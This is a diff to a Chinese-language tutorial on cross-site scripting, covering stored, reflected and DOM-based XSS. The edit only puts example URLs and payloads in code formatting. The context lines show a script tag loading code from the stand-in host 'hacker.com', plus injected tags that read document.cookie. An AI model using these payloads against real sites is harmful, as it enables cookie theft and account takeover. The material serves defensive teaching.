@@ -24,7 +24,7 @@ toc:
 
 > 存储型XSS，是指攻击者利用网页的输入功能，将恶意脚本持久化在服务端，当任意用户访问页面导致该数据被渲染时，恶意脚本便会被浏览器执行，从而形成攻击获取用户本地信息。
 
-攻击者可以利用<script>标签做攻击脚本，填写在某个页面的用户数据收集处，比如填写下方内容，其中 xxx.js 就包含了恶意代码。
+攻击者可以利用`<script>`标签做攻击脚本，填写在某个页面的用户数据收集处，比如填写下方内容，其中 xxx.js 就包含了恶意代码。
 
 ```html
 <script src="http://hacker.com/script/xxx.js"/>
@@ -52,15 +52,15 @@ xhr.send();
 
 > 反射型XSS，是指攻击者不会将恶意脚本持久化在服务端，而是构造一些恶意连接诱导正常用户访问，这类`XSS`的特性是需要和正常用户产生交互。与DOM型XSS的区别是攻击的链接实际上是一些服务端请求链接。
 
-比如对于一个请求链接：http://www.normal.com/get?uid=，正常使用的时候，实际上 uid 参数会带上用户的身份标识。攻击者利用这个链接，往往会构造出恶意执行脚本拼接在参数后方，比如：http://www.normal.com/get?uid=<script>alert(document.cookie)</script>，只要诱导用户点击来这个链接，则可以窃取用户的登录 cookie 信息。
+比如对于一个请求链接：`http://www.normal.com/get?uid=`，正常使用的时候，实际上 uid 参数会带上用户的身份标识。攻击者利用这个链接，往往会构造出恶意执行脚本拼接在参数后方，比如：`http://www.normal.com/get?uid=<script>alert(document.cookie)</script>`，只要诱导用户点击来这个链接，则可以窃取用户的登录 cookie 信息。
 
 ## 三、DOM型XSS
 
 > DOM型XSS，是一种特殊的反射型XSS，这种类型的`XSS`是利用了`DOM`标签的一些特性，并且不需要和服务端通信。
 
-比如对于一个页面访问请求：http://www.normal.com/user.html?uid=，正常使用的时候，实际上 uid 参数会带上用户的身份标识。
+比如对于一个页面访问请求：`http://www.normal.com/user.html?uid=`，正常使用的时候，实际上 uid 参数会带上用户的身份标识。
 
-攻击者可以利用这个链接，构造一个虚假的DOM元素出来，比如：http://www.normal.com/user.html?uid=<input type="button" value="登录" onClick="alter(document.cookie)"/>，也可以不需要和用户交互的：http://www.normal.com/user.html?uid=\<img src='notFound.jpg' onerror="alter(document.cookie)"/>
+攻击者可以利用这个链接，构造一个虚假的DOM元素出来，比如：`http://www.normal.com/user.html?uid=<input type="button" value="登录" onClick="alter(document.cookie)"/>`，也可以不需要和用户交互的：`http://www.normal.com/user.html?uid=<img src='notFound.jpg' onerror="alter(document.cookie)"/>`
 
 ## 四、防护策略
 
